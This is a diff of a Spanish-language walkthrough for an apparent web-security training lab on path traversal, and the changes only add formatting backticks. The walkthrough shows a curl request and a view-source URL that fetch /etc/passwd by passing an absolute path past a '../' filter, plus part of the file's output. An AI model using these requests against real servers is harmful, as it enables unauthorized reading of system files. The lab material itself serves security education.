@@ -24,25 +24,25 @@ image:
   
 ## Descripción
 
-Este laboratorio contiene una vulnerabilidad de path traversal en la `visualización de imágenes de productos`. La aplicación bloquea el `../`, pero trata el nombre de archivo proporcionado como relativo a un directorio de trabajo predeterminado. Para resolver el laboratorio, hay que obtener el contenido del archivo `/etc/passwd`
+Este `laboratorio` contiene una `vulnerabilidad` de `path traversal` en la `visualización` de `imágenes` de `productos`. La aplicación bloquea el `../`, pero trata el `nombre` de `archivo` proporcionado como `relativo` a un `directorio` de trabajo `predeterminado`. Para `resolver` el `laboratorio`, hay que `obtener` el contenido del archivo `/etc/passwd`
 
 ---
 
 ## Guía de path traversal
 
-Antes de completar este laboratorio es recomendable leerse esta `guía de path traversal` [https://justice-reaper.github.io/posts/Path-Traversal-Guide/](https://justice-reaper.github.io/posts/Path-Traversal-Guide/)
+`Antes` de `completar` este `laboratorio` es recomendable `leerse` esta `guía de path traversal` [https://justice-reaper.github.io/posts/Path-Traversal-Guide/](https://justice-reaper.github.io/posts/Path-Traversal-Guide/)
 
 ## Resolución
 
-Al acceder a la web nos sale esto
+Al `acceder` a la `web` nos sale esto
 
 ![](/assets/img/Path-Traversal-Lab-2/image_1.png)
 
-Si hacemos `Ctrl + U` vemos como se están cargando las `imágenes`
+Si hacemos `Ctrl + U` vemos como se están `cargando` las `imágenes`
 
 ![](/assets/img/Path-Traversal-Lab-2/image_2.png)
 
-Probamos un directory path traversal
+Probamos un `directory path traversal`
 
 ```
 # curl 'https://0ab4006004d3a9a2800f449c00c00083.web-security-academy.net/image?filename=/etc/passwd'                                                                
@@ -89,7 +89,7 @@ pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
 gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
 ```
 
-Si lo queremos hacerlo desde la web debemos poner `view-source://`
+Si lo queremos hacerlo desde la `web` debemos poner `view-source://`
 
 ```
 view-source:https://0ab4006004d3a9a2800f449c00c00083.web-security-academy.net/image?filename=./etc/passwd
